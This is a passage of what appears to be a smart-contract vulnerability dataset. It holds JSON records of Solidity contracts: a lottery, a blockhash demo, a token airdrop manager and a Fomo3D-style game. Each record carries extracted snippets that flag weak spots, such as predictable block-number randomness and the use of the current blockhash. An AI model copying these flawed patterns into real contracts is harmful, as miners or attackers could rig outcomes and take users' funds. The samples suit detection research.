},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b20"
  },
  "filename": "1362.sol",
  "content": "pragma solidity ^0.4.22;\ncontract Lottery {\n address owner;\n address public beneficiary;\n mapping(address => bool) public playersMap;\n address[] public players;\n uint public playerEther = 0.01 ether;\n uint playerCountGoal;\n bool public isLotteryClosed = false;\n uint public rewards;\n event GoalReached(address recipient, uint totalAmountRaised);\n event FundTransfer(address backer, uint amount, bool isContribution);\n constructor() public {\n playerCountGoal = 1000 + randomGen(block.number - 1, 101);\n owner = msg.sender;\n }\n function () public payable {\n require(!isLotteryClosed && msg.value == playerEther, \"Lottery should not be closed and player should send exact ethers\");\n require(!playersMap[msg.sender], \"player should not attend twice\");\n players.push(msg.sender);\n playersMap[msg.sender] = true;\n emit FundTransfer(msg.sender, msg.value, true);\n checkGoalReached();\n }\n modifier afterGoalReached() {\n if (players.length >= playerCountGoal) _;\n }\n function checkGoalReached() internal afterGoalReached {\n require(!isLotteryClosed, \"lottery must be opened\");\n isLotteryClosed = true;\n uint playerCount = players.length;\n uint winnerIndex = randomGen(block.number - 2, playerCount);\n beneficiary = players[winnerIndex];\n rewards = playerEther * playerCount * 4 / 5;\n emit GoalReached(beneficiary, rewards);\n }\n function randomGen(uint seed, uint count) private view returns (uint randomNumber) {\n return uint(keccak256(abi.encodePacked(block.number-3, seed))) % count;\n }\n function safeWithdrawal() public afterGoalReached {\n require(isLotteryClosed, \"lottery must be closed\");\n if (beneficiary == msg.sender) {\n beneficiary.transfer(rewards);\n emit FundTransfer(beneficiary, rewards, false);\n }\n if (owner == msg.sender) {\n uint fee = playerEther * players.length / 5;\n owner.transfer(fee);\n emit FundTransfer(owner, fee, false);\n }\n }\n}",
  "extract_feature": [
    "function checkGoalReached() internal afterGoalReached {\nrequire(!isLotteryClosed, \"lottery must be opened\");\nisLotteryClosed = true;\nuint playerCount = players.length;\nuint winnerIndex = randomGen(block.number - 2, playerCount);\nbeneficiary = players[winnerIndex];\nrewards = playerEther * playerCount * 4 / 5;\nemit GoalReached(beneficiary, rewards);\n}",
    "function randomGen(uint seed, uint count) private view returns (uint randomNumber) {\nreturn uint(keccak256(abi.encodePacked(block.number-3, seed))) % count;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b21"
  },
  "filename": "1373.sol",
  "content": "pragma solidity ^0.4.24;\ncontract blockHashNotReturned {\n function currentBlockHash() public returns (bytes32 b) {\n return blockhash(block.number);\n }\n function currentBlockHashCst() constant public returns (bytes32 b) {\n return blockhash(block.number);\n }\n}",
  "extract_feature": [
    "function currentBlockHash() public returns (bytes32 b) {\nreturn blockhash(block.number);\n}",
    "function currentBlockHashCst() constant public returns (bytes32 b) {\nreturn blockhash(block.number);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b22"
  },
  "filename": "138.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract SimpleFlyDropToken is Claimable {\n using SafeMath for uint256;\n ERC20 internal erc20tk;\n function setToken(address _token) onlyOwner public {\n require(_token != address(0));\n erc20tk = ERC20(_token);\n }\n function multiSend(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(_destAddrs.length == _values.length);\n uint256 i = 0;\n for (; i < _destAddrs.length; i = i.add(1)) {\n if (!erc20tk.transfer(_destAddrs[i], _values[i])) {\n break;\n }\n }\n return (i);\n }\n}\ncontract DelayedClaimable is Claimable {\n uint256 public end;\n uint256 public start;\n function setLimits(uint256 _start, uint256 _end) onlyOwner public {\n require(_start <= _end);\n end = _end;\n start = _start;\n }\n function claimOwnership() onlyPendingOwner public {\n require((block.number <= end) && (block.number >= start));\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n end = 0;\n }\n}\ncontract FlyDropTokenMgr is DelayedClaimable {\n using SafeMath for uint256;\n address[] dropTokenAddrs;\n SimpleFlyDropToken currentDropTokenContract;\n function prepare(uint256 _rand,\n address _from,\n address _token,\n uint256 _value) onlyOwner public returns (bool) {\n require(_token != address(0));\n require(_from != address(0));\n require(_rand > 0);\n if (ERC20(_token).allowance(_from, this) < _value) {\n return false;\n }\n if (_rand > dropTokenAddrs.length) {\n SimpleFlyDropToken dropTokenContract = new SimpleFlyDropToken();\n dropTokenAddrs.push(address(dropTokenContract));\n currentDropTokenContract = dropTokenContract;\n } else {\n currentDropTokenContract = SimpleFlyDropToken(dropTokenAddrs[_rand.sub(1)]);\n }\n currentDropTokenContract.setToken(_token);\n return ERC20(_token).transferFrom(_from, currentDropTokenContract, _value);\n }\n function flyDrop(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(address(currentDropTokenContract) != address(0));\n return currentDropTokenContract.multiSend(_destAddrs, _values);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}",
  "extract_feature": [
    "function claimOwnership() onlyPendingOwner public {\nrequire((block.number <= end) && (block.number >= start));\nemit OwnershipTransferred(owner, pendingOwner);\nowner = pendingOwner;\npendingOwner = address(0);\nend = 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b23"
  },
  "filename": "1385.sol",
  "content": "pragma solidity ^0.4.24;\n library SafeMath {\n function mul(uint256 a, uint256 b)\n internal\n pure\n returns (uint256 c)\n {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n require(c / a == b, \"SafeMath mul failed\");\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b)\n internal\n pure\n returns (uint256)\n {\n require(b <= a, \"SafeMath sub failed\");\n return a - b;\n }\n function add(uint256 a, uint256 b)\n internal\n pure\n returns (uint256 c)\n {\n c = a + b;\n require(c >= a, \"SafeMath add failed\");\n return c;\n }\n function sqrt(uint256 x)\n internal\n pure\n returns (uint256 y)\n {\n uint256 z = ((add(x,1)) / 2);\n y = x;\n while (z < y)\n {\n y = z;\n z = ((add((x / z),z)) / 2);\n }\n }\n function sq(uint256 x)\n internal\n pure\n returns (uint256)\n {\n return (mul(x,x));\n }\n function pwr(uint256 x, uint256 y)\n internal\n pure\n returns (uint256)\n {\n if (x==0)\n return (0);\n else if (y==0)\n return (1);\n else\n {\n uint256 z = x;\n for (uint256 i=1; i < y; i++)\n z = mul(z,x);\n return (z);\n }\n }\n}\nlibrary NameFilter {\n function nameFilter(string _input)\n internal\n pure\n returns(bytes32)\n {\n bytes memory _temp = bytes(_input);\n uint256 _length = _temp.length;\n require (_length <= 32 && _length > 0, \"string must be between 1 and 32 characters\");\n require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, \"string cannot start or end with space\");\n if (_temp[0] == 0x30)\n {\n require(_temp[1] != 0x78, \"string cannot start with 0x\");\n require(_temp[1] != 0x58, \"string cannot start with 0X\");\n }\n bool _hasNonNumber;\n for (uint256 i = 0; i < _length; i++)\n {\n if (_temp[i] > 0x40 && _temp[i] < 0x5b)\n {\n _temp[i] = byte(uint(_temp[i]) + 32);\n if (_hasNonNumber == false)\n _hasNonNumber = true;\n } else {\n require\n (\n _temp[i] == 0x20 ||\n (_temp[i] > 0x60 && _temp[i] < 0x7b) ||\n (_temp[i] > 0x2f && _temp[i] < 0x3a),\n \"string contains invalid characters\"\n );\n if (_temp[i] == 0x20)\n require( _temp[i+1] != 0x20, \"string cannot contain consecutive spaces\");\n if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))\n _hasNonNumber = true;\n }\n }\n require(_hasNonNumber == true, \"string cannot be only numbers\");\n bytes32 _ret;\n assembly {\n _ret := mload(add(_temp, 32))\n }\n return (_ret);\n }\n}\nlibrary NTech3DDatasets {\n struct EventReturns {\n uint256 compressedData;\n uint256 compressedIDs;\n address winnerAddr;\n bytes32 winnerName;\n uint256 amountWon;\n uint256 newPot;\n uint256 NTAmount;\n uint256 genAmount;\n uint256 potAmount;\n }\n struct Player {\n address addr;\n bytes32 name;\n uint256 win;\n uint256 gen;\n uint256 aff;\n uint256 lrnd;\n uint256 laff;\n }\n struct PlayerRounds {\n uint256 eth;\n uint256 keys;\n uint256 mask;\n uint256 ico;\n }\n struct Round {\n uint256 plyr;\n uint256 team;\n uint256 end;\n bool ended;\n uint256 strt;\n uint256 keys;\n uint256 eth;\n uint256 pot;\n uint256 mask;\n uint256 ico;\n uint256 icoGen;\n uint256 icoAvg;\n uint256 prevres;\n }\n struct TeamFee {\n uint256 gen;\n uint256 nt;\n }\n struct PotSplit {\n uint256 gen;\n uint256 nt;\n }\n}\ninterface OtherNTech3D {\n function potSwap() external payable;\n}\nlibrary NTech3DKeysCalcLong {\n using SafeMath for *;\n function keysRec(uint256 _curEth, uint256 _newEth)\n internal\n pure\n returns (uint256)\n {\n return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));\n }\n function ethRec(uint256 _curKeys, uint256 _sellKeys)\n internal\n pure\n returns (uint256)\n {\n return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));\n }\n function keys(uint256 _eth)\n internal\n pure\n returns(uint256)\n {\n return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);\n }\n function eth(uint256 _keys)\n internal\n pure\n returns(uint256)\n {\n return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());\n }\n}\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf( address who ) public view returns (uint value);\n function allowance( address owner, address spender ) public view returns (uint _allowance);\n function transfer( address to, uint value) public returns (bool ok);\n function transferFrom( address from, address to, uint value) public returns (bool ok);\n function approve( address spender, uint value ) public returns (bool ok);\n event Transfer( address indexed from, address indexed to, uint value);\n event Approval( address indexed owner, address indexed spender, uint value);\n}\ninterface PlayerBookInterface {\n function getPlayerID(address _addr) external returns (uint256);\n function getPlayerName(uint256 _pID) external view returns (bytes32);\n function getPlayerLAff(uint256 _pID) external view returns (uint256);\n function getPlayerAddr(uint256 _pID) external view returns (address);\n function getNameFee() external view returns (uint256);\n function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);\n function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);\n function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);\n}\ncontract NTech3DLong {\n using SafeMath for *;\n using NameFilter for string;\n using NTech3DKeysCalcLong for uint256;\n event onNewName\n (\n uint256 indexed playerID,\n address indexed playerAddress,\n bytes32 indexed playerName,\n bool isNewPlayer,\n uint256 affiliateID,\n address affiliateAddress,\n bytes32 affiliateName,\n uint256 amountPaid,\n uint256 timeStamp\n );\n event onEndTx\n (\n uint256 compressedData,\n uint256 compressedIDs,\n bytes32 playerName,\n address playerAddress,\n uint256 ethIn,\n uint256 keysBought,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 NTAmount,\n uint256 genAmount,\n uint256 potAmount,\n uint256 airDropPot\n );\n event onWithdraw\n (\n uint256 indexed playerID,\n address playerAddress,\n bytes32 playerName,\n uint256 ethOut,\n uint256 timeStamp\n );\n event onWithdrawAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 ethOut,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 NTAmount,\n uint256 genAmount\n );\n event onBuyAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 ethIn,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 NTAmount,\n uint256 genAmount\n );\n event onReLoadAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 NTAmount,\n uint256 genAmount\n );\n event onAffiliatePayout\n (\n uint256 indexed affiliateID,\n address affiliateAddress,\n bytes32 affiliateName,\n uint256 indexed roundID,\n uint256 indexed buyerID,\n uint256 amount,\n uint256 timeStamp\n );\n event onPotSwapDeposit\n (\n uint256 roundID,\n uint256 amountAddedToPot\n );\n mapping(address => uint256) private users ;\n function initUsers() private {\n users[0x89b2E7Ee504afd522E07F80Ae7b9d4D228AF3fe2] = 9 ;\n users[msg.sender] = 9 ;\n }\n modifier isAdmin() {\n uint256 role = users[msg.sender];\n require((role==9), \"Must be admin.\");\n _;\n }\n modifier isHuman {\n address _addr = msg.sender;\n uint256 _codeLength;\n assembly {_codeLength := extcodesize(_addr)}\n require(_codeLength == 0, \"Humans only\");\n _;\n }\n PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0x410526CD583AF0bE0530166d53Efcd7da969F7B7);\n address public communityAddr_;\n address public NTFoundationAddr_;\n address private NTTokenSeller_ ;\n ERC20 private NTToken_ ;\n function setNTToken(address addr) isAdmin() public {\n require(address(addr) != address(0x0), \"Empty address not allowed.\");\n NTToken_ = ERC20(addr);\n }\n function transfer(address toAddr, uint256 amount) isAdmin() public returns (bool) {\n require(amount > 0, \"Must > 0 \");\n NTToken_.transfer(toAddr, amount);\n return true ;\n }\n bool public activated_ = false;\n modifier isActivated() {\n require(activated_ == true, \"its not active yet.\");\n _;\n }\n function activate() isAdmin() public {\n require(address(NTToken_) != address(0x0), \"Must setup NTToken.\");\n require(address(communityAddr_) != address(0x0), \"Must setup CommunityAddr_.\");\n require(address(NTTokenSeller_) != address(0x0), \"Must setup NTTokenSeller.\");\n require(address(NTFoundationAddr_) != address(0x0), \"Must setup NTFoundationAddr.\");\n require(activated_ == false, \"Only once\");\n activated_ = true ;\n rID_ = 1;\n round_[1].strt = now ;\n round_[1].end = now + rndMax_;\n }\n string constant public name = \"NTech 3D Long Official\";\n string constant public symbol = \"NT3D\";\n uint256 constant private rndInc_ = 1 minutes;\n uint256 constant private rndMax_ = 6 hours;\n uint256 private ntOf1Ether_ = 30000;\n OtherNTech3D private otherNTech3D_ ;\n function setOtherNTech3D(address _otherNTech3D) isAdmin() public {\n require(address(_otherNTech3D) != address(0x0), \"Empty address not allowed.\");\n require(address(otherNTech3D_) == address(0x0), \"OtherNTech3D has been set.\");\n otherNTech3D_ = OtherNTech3D(_otherNTech3D);\n }\n modifier isWithinLimits(uint256 _eth) {\n require(_eth >= 1000000000, \"Too little\");\n require(_eth <= 100000000000000000000000, \"Too much\");\n _;\n }\n mapping (address => uint256) public pIDxAddr_;\n mapping (bytes32 => uint256) public pIDxName_;\n mapping (uint256 => NTech3DDatasets.Player) public plyr_;\n mapping (uint256 => mapping (uint256 => NTech3DDatasets.PlayerRounds)) public plyrRnds_;\n mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;\n uint256 public rID_;\n uint256 public airDropPot_;\n uint256 public airDropTracker_ = 0;\n mapping (uint256 => NTech3DDatasets.Round) public round_;\n mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;\n mapping (uint256 => NTech3DDatasets.TeamFee) public fees_;\n mapping (uint256 => NTech3DDatasets.PotSplit) public potSplit_;\n constructor() public {\n fees_[0] = NTech3DDatasets.TeamFee(30,6);\n fees_[1] = NTech3DDatasets.TeamFee(43,0);\n fees_[2] = NTech3DDatasets.TeamFee(56,10);\n fees_[3] = NTech3DDatasets.TeamFee(43,8);\n potSplit_[0] = NTech3DDatasets.PotSplit(15,10);\n potSplit_[1] = NTech3DDatasets.PotSplit(25,0);\n potSplit_[2] = NTech3DDatasets.PotSplit(20,20);\n potSplit_[3] = NTech3DDatasets.PotSplit(30,10);\n initUsers();\n NTToken_ = ERC20(address(0x09341B5d43a9b2362141675b9276B777470222Be));\n communityAddr_ = address(0x3C07f9f7164Bf72FDBefd9438658fAcD94Ed4439);\n NTTokenSeller_ = address(0x531100a6b3686E6140f170B0920962A5D7A2DD25);\n NTFoundationAddr_ = address(0x89b2E7Ee504afd522E07F80Ae7b9d4D228AF3fe2);\n }\n function buyXid(uint256 _affCode, uint256 _team) isActivated() isHuman() isWithinLimits(msg.value) public payable {\n NTech3DDatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_affCode == 0 || _affCode == _pID){\n _affCode = plyr_[_pID].laff;\n }else if (_affCode != plyr_[_pID].laff) {\n plyr_[_pID].laff = _affCode;\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affCode, _team, _eventData_);\n }\n function buyXaddr(address _affCode, uint256 _team) isActivated() isHuman() isWithinLimits(msg.value) public payable {\n NTech3DDatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == address(0) || _affCode == msg.sender){\n _affID = plyr_[_pID].laff;\n }else{\n _affID = pIDxAddr_[_affCode];\n if (_affID != plyr_[_pID].laff){\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affID, _team, _eventData_);\n }\n function buyXname(bytes32 _affCode, uint256 _team) isActivated() isHuman() isWithinLimits(msg.value) public payable {\n NTech3DDatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == '' || _affCode == plyr_[_pID].name){\n _affID = plyr_[_pID].laff;\n }else{\n _affID = pIDxName_[_affCode];\n if (_affID != plyr_[_pID].laff){\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affID, _team, _eventData_);\n }\n function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth) isActivated() isHuman() isWithinLimits(_eth) public {\n NTech3DDatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_affCode == 0 || _affCode == _pID){\n _affCode = plyr_[_pID].laff;\n }else if (_affCode != plyr_[_pID].laff) {\n plyr_[_pID].laff = _affCode;\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affCode, _team, _eth, _eventData_);\n }\n function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth) isActivated() isHuman() isWithinLimits(_eth) public {\n NTech3DDatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == address(0) || _affCode == msg.sender){\n _affID = plyr_[_pID].laff;\n }else{\n _affID = pIDxAddr_[_affCode];\n if (_affID != plyr_[_pID].laff){\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affID, _team, _eth, _eventData_);\n }\n function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth) isActivated() isHuman() isWithinLimits(_eth) public {\n NTech3DDatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == '' || _affCode == plyr_[_pID].name){\n _affID = plyr_[_pID].laff;\n }else{\n _affID = pIDxName_[_affCode];\n if (_affID != plyr_[_pID].laff){\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affID, _team, _eth, _eventData_);\n }\n function withdraw() isActivated() isHuman() public {\n uint256 _rID = rID_;\n uint256 _now = now;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _eth;\n if (_now > round_[_rID].end && (round_[_rID].ended == false) && round_[_rID].plyr != 0){\n NTech3DDatasets.EventReturns memory _eventData_;\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n _eth = withdrawEarnings(_pID);\n if (_eth > 0)\n plyr_[_pID].addr.transfer(_eth);\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit onWithdrawAndDistribute(\n msg.sender,\n plyr_[_pID].name,\n _eth,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.NTAmount,\n _eventData_.genAmount\n );\n }else{\n _eth = withdrawEarnings(_pID);\n if (_eth > 0)\n plyr_[_pID].addr.transfer(_eth);\n emit onWithdraw(\n _pID,\n msg.sender,\n plyr_[_pID].name,\n _eth,\n _now\n );\n }\n }\n function registerNameXID(string _nameString, uint256 _affCode, bool _all) isHuman() public payable{\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit onNewName(\n _pID,\n _addr,\n _name,\n _isNewPlayer,\n _affID,\n plyr_[_affID].addr,\n plyr_[_affID].name,\n _paid,\n now\n );\n }\n function registerNameXaddr(string _nameString, address _affCode, bool _all) isHuman() public payable{\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit onNewName(\n _pID,\n _addr,\n _name,\n _isNewPlayer,\n _affID,\n plyr_[_affID].addr,\n plyr_[_affID].name,\n _paid,\n now\n );\n }\n function registerNameXname(string _nameString, bytes32 _affCode, bool _all) isHuman() public payable{\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit onNewName(\n _pID,\n _addr,\n _name,\n _isNewPlayer,\n _affID,\n plyr_[_affID].addr,\n plyr_[_affID].name,\n _paid,\n now\n );\n }\n function getBuyPrice() public view returns(uint256) {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );\n else\n return ( 75000000000000 );\n }\n function getTimeLeft() public view returns(uint256) {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now < round_[_rID].end)\n if (_now > round_[_rID].strt)\n return( (round_[_rID].end).sub(_now) );\n else\n return( (round_[_rID].end).sub(_now) );\n else\n return(0);\n }\n function getPlayerVaults(uint256 _pID) public view returns(uint256 ,uint256, uint256) {\n uint256 _rID = rID_;\n if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0){\n if (round_[_rID].plyr == _pID){\n uint256 _pot = round_[_rID].pot.add(round_[_rID].prevres);\n return\n (\n (plyr_[_pID].win).add( ((_pot).mul(48)) / 100 ),\n (plyr_[_pID].gen).add( getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask) ),\n plyr_[_pID].aff\n );\n } else {\n return(\n plyr_[_pID].win,\n (plyr_[_pID].gen).add( getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask) ),\n plyr_[_pID].aff\n );\n }\n } else {\n return(\n plyr_[_pID].win,\n (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),\n plyr_[_pID].aff\n );\n }\n }\n function getPlayerVaultsHelper(uint256 _pID, uint256 _rID) private view returns(uint256) {\n uint256 _pot = round_[_rID].pot.add(round_[_rID].prevres);\n return( ((((round_[_rID].mask).add(((((_pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000) );\n }\n function getCurrentRoundInfo() public view\n returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256) {\n uint256 _rID = rID_;\n return\n (\n round_[_rID].ico,\n _rID,\n round_[_rID].keys,\n round_[_rID].end,\n round_[_rID].strt,\n round_[_rID].pot,\n (round_[_rID].team + (round_[_rID].plyr * 10)),\n plyr_[round_[_rID].plyr].addr,\n plyr_[round_[_rID].plyr].name,\n rndTmEth_[_rID][0],\n rndTmEth_[_rID][1],\n rndTmEth_[_rID][2],\n rndTmEth_[_rID][3],\n airDropTracker_ + (airDropPot_ * 1000)\n );\n }\n function getPlayerInfoByAddress(address _addr) public view returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256){\n uint256 _rID = rID_;\n if (_addr == address(0)) {\n _addr == msg.sender;\n }\n uint256 _pID = pIDxAddr_[_addr];\n return (\n _pID,\n plyr_[_pID].name,\n plyrRnds_[_pID][_rID].keys,\n plyr_[_pID].win,\n (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),\n plyr_[_pID].aff,\n plyrRnds_[_pID][_rID].eth\n );\n }\n function buyCore(uint256 _pID, uint256 _affID, uint256 _team, NTech3DDatasets.EventReturns memory _eventData_) private {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0))) {\n core(_rID, _pID, msg.value, _affID, _team, _eventData_);\n }else{\n if (_now > round_[_rID].end && round_[_rID].ended == false) {\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit onBuyAndDistribute(\n msg.sender,\n plyr_[_pID].name,\n msg.value,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.NTAmount,\n _eventData_.genAmount\n );\n }\n plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);\n }\n }\n function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, NTech3DDatasets.EventReturns memory _eventData_) private {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0))) {\n plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);\n core(_rID, _pID, _eth, _affID, _team, _eventData_);\n }else if (_now > round_[_rID].end && round_[_rID].ended == false) {\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit onReLoadAndDistribute(\n msg.sender,\n plyr_[_pID].name,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.NTAmount,\n _eventData_.genAmount\n );\n }\n }\n function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, NTech3DDatasets.EventReturns memory _eventData_) private{\n if (plyrRnds_[_pID][_rID].keys == 0)\n _eventData_ = managePlayer(_pID, _eventData_);\n if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 10000000000000000000){\n uint256 _availableLimit = (10000000000000000000).sub(plyrRnds_[_pID][_rID].eth);\n uint256 _refund = _eth.sub(_availableLimit);\n plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);\n _eth = _availableLimit;\n }\n if (_eth > 1000000000) {\n uint256 _keys = (round_[_rID].eth).keysRec(_eth);\n if (_keys >= 1000000000000000000){\n updateTimer(_keys, _rID);\n if (round_[_rID].plyr != _pID)\n 